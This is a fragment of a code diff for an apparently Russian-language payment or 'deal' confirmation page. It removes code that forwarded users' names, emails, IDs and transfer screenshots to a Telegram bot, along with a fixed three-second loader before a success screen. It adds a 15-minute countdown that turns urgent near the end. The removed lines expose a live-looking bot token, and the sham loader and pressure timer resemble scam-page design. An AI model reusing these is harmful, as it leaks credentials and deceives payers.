-    // ВСТАВЬ СВОИ ДАННЫЕ СЮДА
-    const BOT_TOKEN = '8748333798:AAGT_Pt6eDB5YGuh2foXBYCMhzc5ylBk8Z8'; 
-    const CHAT_ID = '-1003705130228'; // КАНАЛ
-
-    // 3. Отправляем в Telegram (канал, без топиков)
-    const sendToTelegram = async () => {
-      try {
-        // Генерируем уникальный номер сделки
-        const dealId = `#${Date.now().toString(36).toUpperCase()}-${userId.toString().slice(-4)}`;
-
-        // Формируем сообщение со всей информацией о пользователе
-        const messageText = 
-`*НОВАЯ СДЕЛКА* ${dealId}
-
-*Пользователь:* ${fullName}
-*ID:* ${userId}
-*Юзернейм:* ${username}
-*Email:* ${document.getElementById('emailInput').value.trim()}
-*Комментарий:* ${comment || '—'}
-
-*Статус:* Ожидает подтверждения`;
-
-        // Отправляем текстовое сообщение в канал
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: messageText,
-            parse_mode: 'Markdown'
-          })
-        });
-
-        // Отправляем скриншот в канал
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', file);
-        formData.append('caption', ` *Скриншот перевода* (${dealId})`);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-
-      } catch (e) {
-        console.error('Ошибка отправки в Telegram', e);
+  let timeLeft = 14 * 60 + 59;
+  function startTimer() {
+    const fill = document.getElementById('timer-fill');
+    const digits = document.getElementById('timer-digits');
+    const total = 15 * 60;
+    const tick = () => {
+      if (timeLeft <= 0) return;
+      timeLeft--;
+      const m = Math.floor(timeLeft / 60);
+      const s = timeLeft % 60;
+      digits.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+      fill.style.width = (timeLeft / total * 100) + '%';
+      if (timeLeft < 60) {
+        fill.classList.add('urgent');
+        digits.classList.add('urgent');
       }
     };
-
-    // Запускаем отправку в фоне
-    sendToTelegram();
-
-    // 4. Показываем лоадер ровно 3 секунды, затем экран успеха
-    setTimeout(()=>{
-      document.getElementById('screen-init').classList.remove('active');
-      document.getElementById('screen-success').classList.add('active');
-    }, 3000);
+    setInterval(tick, 1000);
   }
 </script>
 </body>
